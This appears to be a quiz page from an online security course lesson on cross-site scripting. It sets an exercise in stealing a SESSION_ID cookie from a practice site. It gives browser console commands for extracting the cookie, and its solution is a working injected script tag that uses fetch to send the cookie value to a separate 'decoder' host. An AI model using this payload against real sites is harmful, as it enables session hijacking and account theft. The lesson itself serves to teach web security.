# Lesson 5.12 Quiz: XSS Quiz

1. Send a fetch request from the badwesite to the decoder website
2. the fetch URL must include a key (http://example.com/?key=)
3. Use JavaScript to set the key's value to the badwebsite's SESSION_ID cookie

[Supporing Materials](http://video.udacity-data.com.s3.amazonaws.com/topher/2016/June/575717f7_l5-xss-binary/l5-xss-binary.zip)

On console in http://badwebsite.127.0.0.1.xip.io:8080, type in:
- document.cookie
- document.cookie.split('=')
- document.cookie.split('=')[1]

OR
```
document.cookie.slice(
  document.cookie.indexOf('SESSION_ID')
).split('=')[1]
```

Solution:
```
<script>fetch( 'http://decoder.127.0.0.1.xip.io:8080/?key=' + document.cookie.slice( document.cookie.indexOf('SESSION_ID') ).split('=')[1] )</script>
```
- - -
Next up: [Security Outro](ND024_Part4_Lesson05_13.md) or return to [Table Of Contents](./ND024_TableOfContents.md)
